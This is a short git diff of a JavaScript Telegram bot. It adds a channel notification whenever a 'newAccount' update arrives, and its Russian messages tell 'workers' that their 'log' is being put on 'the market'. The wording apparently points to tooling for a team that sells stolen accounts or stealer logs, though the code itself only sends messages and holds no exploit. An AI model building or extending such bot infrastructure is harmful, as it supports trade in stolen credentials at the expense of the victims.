@@ -1,6 +1,6 @@
 // my modules import
 
-const { token } = require("./config");
+const { token, logsChannelId } = require("./config");
 const db = require("./database");
 const cmdStart = require("./botCreatingTools/cmdWorking");
 const axios = require("axios");
@@ -113,7 +113,8 @@ const getUpdates = async () => {
         if(update.type == "newAccount")
         {
             try{
-            await bot.telegram.sendMessage(update.worker_id, `🎉 Вам пришёл лог #${update.id}! Лог выставляется на маркет, ожидайте.`);
+                await bot.telegram.sendMessage(update.worker_id, `🎉 Вам пришёл лог #${update.id}! Лог выставляется на маркет, ожидайте.`);
+                await bot.telegram.sendMessage(logsChannelId, `Новый лог #${update.id} от <a href="tg://user?id=${update.worker_id}">воркера</a>`, {parse_mode: 'HTML'})
             }
             catch {
 
